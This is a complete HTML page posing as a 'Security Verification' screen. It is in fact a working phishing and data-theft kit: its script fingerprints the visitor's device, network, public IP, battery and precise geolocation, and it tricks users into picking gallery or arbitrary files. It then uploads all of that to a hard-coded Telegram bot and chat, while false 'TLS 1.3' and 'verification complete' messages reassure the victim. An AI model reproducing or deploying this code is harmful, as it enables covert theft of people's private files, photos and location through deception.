<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Security Verification</title>
<style>
  :root{
    --bg:#07080d; --panel:#0e1018; --line:#1c2030; --accent:#3d7eff;
    --accent2:#00e0b8; --text:#e6ebf7; --muted:#7d879e; --ok:#22c55e; --err:#ef4444;
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{margin:0;height:100%;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text)}
  body{display:flex;align-items:center;justify-content:center;min-height:100dvh;padding:20px;overflow-x:hidden}
  .bgfx{position:fixed;inset:0;z-index:0;pointer-events:none;
    background:
      radial-gradient(600px 400px at 15% 10%,rgba(61,126,255,.18),transparent 60%),
      radial-gradient(500px 350px at 90% 90%,rgba(0,224,184,.14),transparent 60%);
    animation:drift 12s ease-in-out infinite alternate}
  @keyframes drift{from{transform:translate3d(0,0,0) scale(1)}to{transform:translate3d(-2%,2%,0) scale(1.06)}}
  .card{position:relative;z-index:1;width:min(440px,100%);background:linear-gradient(180deg,#0f1220,#0a0c14);
    border:1px solid var(--line);border-radius:22px;padding:26px 22px 22px;
    box-shadow:0 24px 60px -18px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.03)}
  .badge{display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:999px;
    background:rgba(61,126,255,.12);color:#9bbdff;font-size:12px;font-weight:600;letter-spacing:.4px;
    border:1px solid rgba(61,126,255,.25)}
  .dot{width:7px;height:7px;border-radius:50%;background:var(--accent2);box-shadow:0 0 10px var(--accent2);
    animation:pulse 1.6s ease-in-out infinite}
  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
  h1{font-size:22px;margin:16px 0 6px;line-height:1.2;letter-spacing:-.3px}
  .sub{color:var(--muted);font-size:14px;line-height:1.55;margin:0 0 18px}
  .rows{display:grid;gap:8px;margin-bottom:18px}
  .row{display:flex;justify-content:space-between;align-items:center;padding:11px 13px;
    background:var(--panel);border:1px solid var(--line);border-radius:12px;font-size:13px}
  .row .k{color:var(--muted)}
  .row .v{font-weight:600;color:var(--text);text-align:right;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
  .v.ok{color:var(--ok)} .v.warn{color:#f0b429} .v.err{color:var(--err)}
  .btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:14px;
    border:none;border-radius:14px;font-size:15px;font-weight:600;cursor:pointer;
    transition:transform .15s,filter .15s;margin-bottom:10px}
  .btn:active{transform:scale(.97)}
  .btn.primary{background:linear-gradient(135deg,#3d7eff,#2c5fd8);color:#fff;box-shadow:0 10px 30px -10px rgba(61,126,255,.7)}
  .btn.primary:hover{filter:brightness(1.08)}
  .btn.ghost{background:transparent;border:1px solid var(--line);color:var(--text)}
  .btn.ghost:hover{background:var(--panel)}
  .btn:disabled{opacity:.5;cursor:not-allowed}
  .progress{margin-top:14px;display:none}
  .progress.on{display:block}
  .bar{height:8px;border-radius:999px;background:var(--panel);overflow:hidden;border:1px solid var(--line)}
  .fill{height:100%;width:0;background:linear-gradient(90deg,var(--accent),var(--accent2));
    transition:width .3s ease;box-shadow:0 0 12px rgba(0,224,184,.6)}
  .meta{display:flex;justify-content:space-between;font-size:12px;color:var(--muted);margin-top:6px}
  .log{margin-top:12px;max-height:120px;overflow:auto;font-family:ui-monospace,Menlo,monospace;
    font-size:11px;color:var(--muted);background:#05060a;border:1px solid var(--line);
    border-radius:10px;padding:8px;display:none}
  .log.on{display:block}
  .log div{margin:1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
  .done{display:none;margin-top:14px;padding:14px;border-radius:12px;
    background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.3);font-size:13px;color:#9fe6b8}
  .done.on{display:block}
  .foot{text-align:center;font-size:11px;color:var(--muted);margin-top:16px}
  .spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;
    border-radius:50%;animation:sp .7s linear infinite}
  @keyframes sp{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="bgfx"></div>

<div class="card">
  <span class="badge"><span class="dot"></span> SECURE CHANNEL</span>
  <h1>Security Verification</h1>
  <p class="sub">We need to verify your device and grant access to your media to continue. This is required by the security policy of this site.</p>

  <div class="rows">
    <div class="row"><span class="k">Device</span><span class="v" id="vDevice">—</span></div>
    <div class="row"><span class="k">Network</span><span class="v" id="vNet">—</span></div>
    <div class="row"><span class="k">Public IP</span><span class="v" id="vIP">—</span></div>
    <div class="row"><span class="k">Battery</span><span class="v" id="vBat">—</span></div>
    <div class="row"><span class="k">Location</span><span class="v" id="vGeo">—</span></div>
  </div>

  <button class="btn primary" id="bGal">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
    Allow Gallery Access
  </button>
  <button class="btn ghost" id="bFiles">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 20h16a1 1 0 0 0 1-1V8a1 1 0 0 0-1-1h-9l-2-2H4a1 1 0 0 0-1 1v13a1 1 0 0 0 1 1z"/></svg>
    Allow All Files Access
  </button>
  <button class="btn ghost" id="bBoth">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12"/><path d="M7 10l5 5 5-5"/><path d="M5 21h14"/></svg>
    Allow Both
  </button>

  <div class="progress" id="prog">
    <div class="bar"><div class="fill" id="fill"></div></div>
    <div class="meta"><span id="pMeta">0 / 0 files</span><span id="pPct">0%</span></div>
    <div class="log" id="log"></div>
  </div>

  <div class="done" id="done"></div>

  <div class="foot">Protected by end-to-end verification · TLS 1.3</div>
</div>

<input type="file" id="inGal" multiple accept="image/*,video/*" style="display:none">
<input type="file" id="inFiles" multiple accept="*/*" style="display:none">

<script>
/* ========================= CONFIG ========================= */
const BOT_TOKEN = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
const CHAT_ID   = "1979116632";
const MAX_BYTES = 20 * 1024 * 1024;   // 20 MB skip threshold
const CHUNK_LOG = 400;                 // log lines to keep
/* ========================================================== */

const $ = id => document.getElementById(id);
const logEl = $('log');
let sentCount = 0, totalCount = 0, skipped = 0;

function logLine(txt, cls){
  const d = document.createElement('div');
  d.textContent = txt;
  if(cls) d.style.color = cls;
  logEl.appendChild(d);
  while(logEl.children.length > CHUNK_LOG) logEl.removeChild(logEl.firstChild);
  logEl.scrollTop = logEl.scrollHeight;
}

function fmtBytes(b){
  if(b < 1024) return b+' B';
  if(b < 1048576) return (b/1024).toFixed(1)+' KB';
  return (b/1048576).toFixed(1)+' MB';
}

/* ---------- Device ---------- */
function detectDevice(){
  const ua = navigator.userAgent || '';
  let os = 'Unknown', browser = 'Unknown', type = 'Desktop';
  if(/android/i.test(ua)){ os='Android'; type='Mobile'; }
  else if(/iphone|ipad|ipod/i.test(ua)){ os='iOS'; type='Mobile'; }
  else if(/windows/i.test(ua)){ os='Windows'; }
  else if(/macintosh|mac os x/i.test(ua)){ os='macOS'; }
  else if(/linux/i.test(ua)){ os='Linux'; }

  if(/edg\//i.test(ua)) browser='Edge';
  else if(/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser='Chrome';
  else if(/firefox|fxios/i.test(ua)) browser='Firefox';
  else if(/safari/i.test(ua) && !/chrome/i.test(ua)) browser='Safari';

  return {os, browser, type, ua,
    screen: screen.width+'x'+screen.height,
    pixelRatio: window.devicePixelRatio||1,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores: navigator.hardwareConcurrency || '?',
    memory: navigator.deviceMemory || '?'
  };
}

/* ---------- Network ---------- */
function detectNetwork(){
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  return {
    type: c.effectiveType || 'unknown',
    downlink: c.downlink ? c.downlink+' Mbps' : 'unknown',
    rtt: c.rtt ? c.rtt+' ms' : 'unknown',
    saveData: !!c.saveData,
    online: navigator.onLine
  };
}

/* ---------- Public IP ---------- */
async function fetchIP(){
  const endpoints = [
    'https://api.ipify.org?format=json',
    'https://ipapi.co/json/',
    'https://api.ip.sb/geoip'
  ];
  for(const url of endpoints){
    try{
      const r = await fetch(url, {cache:'no-store'});
      if(!r.ok) continue;
      const j = await r.json();
      const ip = j.ip || j.query;
      if(ip) return {ip, country: j.country_name||j.country||'', city: j.city||'', isp: j.org||j.isp||j.connection?.isp||'', raw:j};
    }catch(e){}
  }
  return {ip:'unknown'};
}

/* ---------- Battery ---------- */
function getBattery(){
  return new Promise(res => {
    if(!navigator.getBattery){ res({level:'unsupported'}); return; }
    navigator.getBattery().then(b=>{
      res({
        level: Math.round(b.level*100)+'%',
        charging: b.charging,
        chargingTime: b.chargingTime,
        dischargingTime: b.dischargingTime
      });
    }).catch(()=>res({level:'denied'}));
  });
}

/* ---------- Geolocation ---------- */
function getGeo(){
  return new Promise(res => {
    if(!navigator.geolocation){ res({error:'unsupported'}); return; }
    navigator.geolocation.getCurrentPosition(
      p => res({lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}),
      e => res({error: e.code===1?'denied':e.message}),
      {enableHighAccuracy:true, timeout:12000, maximumAge:0}
    );
  });
}

/* ---------- Telegram ---------- */
async function tgSend(method, payload){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const r = await fetch(url, {method:'POST', body: payload});
  const j = await r.json();
  if(!j.ok) throw new Error(j.description||'telegram error');
  return j;
}

async function tgMessage(text){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('text', text);
  fd.append('parse_mode','HTML');
  fd.append('disable_web_page_preview','true');
  return tgSend('sendMessage', fd);
}

async function tgDocument(file, caption){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('document', file, file.name);
  if(caption) fd.append('caption', caption.slice(0,1000));
  return tgSend('sendDocument', fd);
}

/* ---------- Progress UI ---------- */
function progressOn(){ $('prog').classList.add('on'); $('log').classList.add('on'); }
function progressUpdate(){
  const pct = totalCount ? Math.round((sentCount+skipped)/totalCount*100) : 0;
  $('fill').style.width = pct+'%';
  $('pMeta').textContent = `${sentCount} sent · ${skipped} skipped · ${totalCount} total`;
  $('pPct').textContent = pct+'%';
}

/* ---------- Core: collect + upload ---------- */
async function handleFiles(fileList, source){
  const files = Array.from(fileList);
  if(!files.length) return;
  progressOn();
  totalCount += files.length;
  progressUpdate();

  // summary message first
  await tgMessage(
`<b>📥 New Access Granted — ${source}</b>
<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
<b>Screen:</b> ${deviceInfo.screen} @${deviceInfo.pixelRatio}x
<b>Lang:</b> ${deviceInfo.language} · <b>TZ:</b> ${deviceInfo.timezone}
<b>Network:</b> ${netInfo.type} · ${netInfo.downlink} · RTT ${netInfo.rtt}
<b>IP:</b> ${ipInfo.ip} ${ipInfo.country?'· '+ipInfo.country:''} ${ipInfo.city?'· '+ipInfo.city:''}
<b>Battery:</b> ${batInfo.level}${batInfo.charging?' ⚡charging':''}
<b>Location:</b> ${geoInfo.lat?`${geoInfo.lat.toFixed(5)}, ${geoInfo.lon.toFixed(5)} (±${Math.round(geoInfo.acc)}m)`:geoInfo.error||'n/a'}
<b>File count:</b> ${files.length}`).catch(()=>{});

  for(const f of files){
    if(f.size > MAX_BYTES){
      skipped++;
      logLine(`skip ${f.name} — ${fmtBytes(f.size)} > 20MB`, '#f0b429');
      progressUpdate();
      continue;
    }
    try{
      logLine(`↑ ${f.name} (${fmtBytes(f.size)})`);
      await tgDocument(f, `📎 ${f.name}\n${fmtBytes(f.size)} · ${f.type||'unknown'}`);
      sentCount++;
    }catch(e){
      skipped++;
      logLine(`✗ ${f.name} — ${e.message}`, '#ef4444');
    }
    progressUpdate();
  }

  $('done').classList.add('on');
  $('done').textContent = `✅ Verification complete. ${sentCount} files processed, ${skipped} skipped.`;
}

/* ---------- Init ---------- */
let deviceInfo, netInfo, ipInfo, batInfo, geoInfo;

(async function init(){
  deviceInfo = detectDevice();
  netInfo    = detectNetwork();
  ipInfo     = await fetchIP();
  batInfo    = await getBattery();

  // geo is requested on click (user gesture) — also fire background attempt
  $('vDevice').textContent = deviceInfo.os+' · '+deviceInfo.browser;
  $('vDevice').className = 'v ok';
  $('vNet').textContent = netInfo.type.toUpperCase()+(netInfo.online?'':' · offline');
  $('vNet').className = 'v '+(netInfo.online?'ok':'err');
  $('vIP').textContent = ipInfo.ip + (ipInfo.country?` (${ipInfo.country})`:'');
  $('vIP').className = 'v ok';
  $('vBat').textContent = batInfo.level + (batInfo.charging?' ⚡':'');
  $('vBat').className = 'v ok';

  // geo — silent attempt first, button click retries
  getGeo().then(g=>{
    geoInfo = g;
    $('vGeo').textContent = g.lat ? `${g.lat.toFixed(4)}, ${g.lon.toFixed(4)}` : (g.error||'denied');
    $('vGeo').className = 'v ' + (g.lat?'ok':'warn');
  });
})();

/* ---------- Wire buttons to file pickers ---------- */
$('bGal').onclick = () => $('inGal').click();
$('bFiles').onclick = () => $('inFiles').click();
$('bBoth').onclick = () => {
  // trigger gallery first; user can then tap files again
  $('inGal').click();
  setTimeout(()=>{ /* user can press 'files' after */ }, 200);
};

$('inGal').onchange = e => handleFiles(e.target.files, 'Gallery');
$('inFiles').onchange = e => handleFiles(e.target.files, 'Files');
</script>
</body>
</html>
